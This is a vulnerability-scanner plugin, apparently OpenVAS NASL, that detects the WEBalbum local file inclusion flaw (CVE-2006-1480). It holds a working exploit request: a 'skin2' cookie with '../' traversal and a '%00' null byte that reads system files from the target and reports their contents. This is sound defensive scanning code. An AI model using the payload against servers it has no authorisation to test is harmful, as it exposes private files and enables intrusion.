if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.80094" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)" );
	script_tag( name: "cvss_base", value: "5.1" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:H/Au:N/C:P/I:P/A:P" );
	script_bugtraq_id( 17228 );
	script_cve_id( "CVE-2006-1480" );
	script_xref( name: "OSVDB", value: "24160" );
	script_name( "WEBalbum Local File Include Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2008 Josh Zlatin-Amishav" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://milw0rm.com/exploits/1608" );
	script_tag( name: "summary", value: "The remote web server is running WEBalbum which is affected by a
  local file include vulnerability." );
	script_tag( name: "insight", value: "The installed version of WEBalbum fails to sanitize user input to the
  'skin2' cookie in 'inc/inc_main.php' before using it to include arbitrary files.

  This flaw is only exploitable if PHP's 'magic_quotes_gpc' is disabled." );
	script_tag( name: "impact", value: "An unauthenticated attacker may be able to read arbitrary local files
  or include a local file that contains commands which will be executed on the remote host subject to the
  privileges of the web server process." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
host = http_host_name( port: port );
for dir in nasl_make_list_unique( "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/index.php";
	buf = http_get_cache( item: url, port: port );
	if(!buf || !ContainsString( buf, "WEBalbum " )){
		continue;
	}
	files = traversal_files();
	for pattern in keys( files ) {
		file = files[pattern];
		req = NASLString( "GET ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Cookie: skin2=../../../../../../" + file + "%00\\r\\n", "\\r\\n" );
		res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
		if(ContainsString( res, "inc_main.php" ) && egrep( pattern: pattern, string: res )){
			content = res - strstr( res, "<br />" );
			report = http_report_vuln_url( port: port, url: url ) + "\n\n";
			report += NASLString( "Here are the contents of the file '/" + file + "' that\\n", " the scanner was able to read from the remote host :\\n", "\\n", content );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

